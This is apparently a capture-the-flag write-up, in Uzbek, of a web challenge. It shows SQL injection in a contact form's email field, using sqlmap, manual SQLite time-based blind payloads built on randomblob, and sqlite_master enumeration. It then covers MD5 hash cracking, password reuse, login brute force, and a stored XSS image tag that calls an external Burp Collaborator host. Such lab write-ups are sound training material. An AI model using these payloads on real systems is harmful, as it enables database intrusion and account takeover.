# Write your report

## Challenge info

```text
Level: Hard
Category: Web

Tavsif:
Tizimda emas, hisobotda zaiflik topish kerak
```

## Solution
1) Directory fuzzing qilish, Contact qismida XSS sinab ko'rganimizdan keyin bitta kichkina quote kiritib ko'rsak zarar qilmaydi Contactdagi email yoki message parametrlariga:

![image](https://github.com/user-attachments/assets/43581ffd-bd75-4939-8f9b-fa4e499b819e)

Booom! Bu degani SQL injection bo'lishi mumkin email parametrida..

2) Birinchi yo'li vaqtni ketkizib o'tirmasdan sqlmap ishlatsak bo'ladi:
```
sqlmap -r raw.txt -p email  --level=3
```
raw.txt ichida request yoziladi:
![image](https://github.com/user-attachments/assets/fcb82c16-d3e1-4f53-bb2a-5b5e6c29dfdc)

3) Sqlmap bilan table nomlarini olib, users table dan hamma ma'lumotni dump qilib olamiz:

![image](https://github.com/user-attachments/assets/a9eee3ae-c2f7-4035-bd04-1e45e18132e6)
Demak tizimda 4 ta user bor 4 xil role bilan, role nomlari user nomlariga to'g'ri kelmayapti lekin qiziq...
![image](https://github.com/user-attachments/assets/c4df5fb3-47e6-47fd-b17d-a780634b6041)
4) Lekin menga manual payload yozish qiziq, demak DBMS SQLite, bu degani backendda taxminan shunday Query foydalanilyapti (Backendni o'zim yozganimda ham baribir boshqa joyda bo'lganda taxminan shunday bo'lishi aniq, shunga taxmin qilinyapti):
```
INSERT INTO contacts (email, message) VALUES ('test@gmail.com', 'test yozuv');
```
Biz kiritgan payload shu Quote ichiga kiritiladi,
```
INSERT INTO contacts (email, message) VALUES ('test@gmail.com', 'test yozuv');
                                                    ^
```
Bu degani bizda Challenge ichida Challenge, VALUES () ni ichidan escape qilish kerak, oddiy boshqa DBMS lardagiga o'xshab escapge qilishga harakat qildim:
```
INSERT INTO contacts (email, message) VALUES ('test@gmail.com', '1')-- - ', 'test yozuv');
```
Maqsad VALUESdagi ') ni yopishimiz kerak, ```', '1')-- - ``` shu uchun kerak oldingi Quoteni yopib, ikkinchi columnga o'zimizni 1 ni kiritib undan keyingi yozuvni Commentga olish. Lekin baribir o'xshamadi, ohiri ) ni yopish o'rniga VALUES () ni ichida Substringga o'xshash Query ishlatish yo'li chiqib qoldi:

```
'||1||'
```
Bu degani:
```
INSERT INTO contacts(email, message) VALUES('' || 1 || '', ?)
```

Email uchum ```test@gmail.com || 1 || ``` yozuvi deb olsak ```||``` orqali ikkita stringni bir-biriga qo'shsak bo'ladi, bu degani "test@gmail1" ko'rinishiga keladi Email DBga yozilgan paytda. Endi

```
'|| SELECT 1 ||'
```

qilib query ishlatsak bo'ladi, teoriya bo'yicha bu error qaytarmaydi hammasi joyida. Agar bitta Quote olib tashlansa 500 javob olamiz, bu degani to'g'ri yo'ldamiz. Endi bizga Boolean based hujum kerak javob to'g'ri-noto'g'riligini bilgani:

```
' || CASE WHEN 1=1 THEN '1' ELSE '0' END || '
```

Lekin CASE WHEN dagi javob har xil bo'lsa ham Response length, status code bir xil keladi. Demak Time-based hujumga o'tishni vaqti keldi, faqat undan oldin harakat qilib ko'rgan yo'limni ko'rsataman:

```
' || CASE WHEN 1=1 THEN "'" ELSE '' END || '
```

Bu degani 1=1 True qaytaradi, keyin Query email ohiriga bitta Quote kiritadi, reja bo'yicha "email'" input DBMSda error berib menga 500 javob qaytishi kerak, lekin Ikkitalik bilan bittalik Quotelarni bitta joyda ishlatishni yo'lini topolmadim.

O'rniga bitta Quote bilan error qaytarish o'rniga uzoqroq vaqtdan keyin javob qaytarishga harakat qilsak bo'ladi ([randomblob docs](https://database.guide/how-randomblob-works-in-sqlite/)):

```
' || CASE WHEN 1=1 THEN hex(randomblob(50000000)) ELSE '' END || '
```

Ohirgi Backenddagi SQL Query shu ko'rinishga keladi:

```
INSERT INTO contacts (email, message) VALUES ('test@gmail.com' || CASE WHEN 1=1 THEN hex(randomblob(50000000)) ELSE '' END || '', 'test yozuv');
```

Information_schemaga o'xshab SQLiteda sqlite_master bor, shu yerdan table name olishimiz mumkin:
```
' || CASE WHEN
(SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1)='users'
THEN hex(randomblob(50000000))
ELSE ''
END || '
```

shu bilan columnlarni birma-bir fuzz qilsak bo'ladi.

5) Bizda 4ta user va parol hashlari bor MD5 ko'rinishida, crack qilsak faqat "appsecchi" uchun parol crack bo'ladi halos parol - "joyland1":

![image](https://github.com/user-attachments/assets/11001d6b-abed-4b6d-a714-394397ae3c44)

6) Lekin bu login va parol bilan kirishni iloji yo'q, dump qilingan user bilan rolega qaraydigan bo'lsak "appsechi" user uchun manager role berilgan, lekin bizda pmanager degan user bor, parolni boshqa userlarga sinab ko'rish kerak..


7) pmanager user uchun crack qilingan "joyland1" parolini ishlatib login qilsak bo'ladi:

![image](https://github.com/user-attachments/assets/f8242f9b-1605-4937-ad28-91e6a9d0a39f)

8) User uchun yangi page "reports" ochiqligini ko'rsak bo'ladi, reportda Demo report ko'rsatilgan:

![image](https://github.com/user-attachments/assets/74c33698-d984-4d78-974f-50531cdd8709)

9) Report ichida yangi login parollarni topish mumkin, ularni oldingi hamma topilgan user bilan parollar ro'yxatiga qo'shamiz:

![image](https://github.com/user-attachments/assets/2125f34a-f26e-40a1-82aa-3111bc9f4a23)

hamma topilgan userlar ro'yxati:
![image](https://github.com/user-attachments/assets/d5db4c19-3396-4a44-b250-b502208c282a)

hamma topilgan parollar ro'yxati:
![image](https://github.com/user-attachments/assets/59e43a19-ba6e-465f-89b0-810e8244697f)

10) Loginda hamma user uchun yangi topilgan parolni Brute force qilamiz, topilgan parol "appsecchi" user uchun to'g'ri keladi:

![image](https://github.com/user-attachments/assets/b3fa4f4b-1570-4ad6-8df2-7d70a0837191)

Aslida brute force qilishni keragi yo'q, demak platforma pentest reportlar saqlash yoki yozish uchun foydalaniladi, bu tizimdan Manager, Pentester, Team Lead pentester, Moderator foydalanadi. Biz topgan Demo reportni "appsecchi" yuklagani ko'rishimiz mumkin, bu degani parol unga tegishli:

![image](https://github.com/user-attachments/assets/a509bbf4-82a7-4c0d-8d5a-b8682bfe154d)

11) "Appsecchi" user yordamida kirilgan yangi feature qo'shiladi:

![image](https://github.com/user-attachments/assets/4bfb6c62-c2bf-4d2f-a8d4-2e6b82d5ea53)

12) "New report" feature orqali yangi report title va text qo'shish mumkin, title boshqa userlarga ko'rinadi, demak taxminan XSS bor, SQLi uchun tekshirishdan foyda yo'q, allaqachon bazaga kirib bo'lganmiz:
```
<img src="http://bcrixlo3qcxq8wpr5x0vysnqchi86zuo.oastify.com/test.html" />
```

![image](https://github.com/user-attachments/assets/de844878-cecc-45c4-ab9d-e9409a41f7d0)

13) Burp Collaboratorda XSS uchun payload ishga tushganini ko'rsak bo'ladi:

![image](https://github.com/user-attachments/assets/4c720c9c-ddbe-4c4f-8579-2d0b7dcdcb42)

Lekin XSS orqali cookie ololmaymiz:
![image](https://github.com/user-attachments/assets/09ad1557-ab6b-4f4d-bf07-e58577511a14)



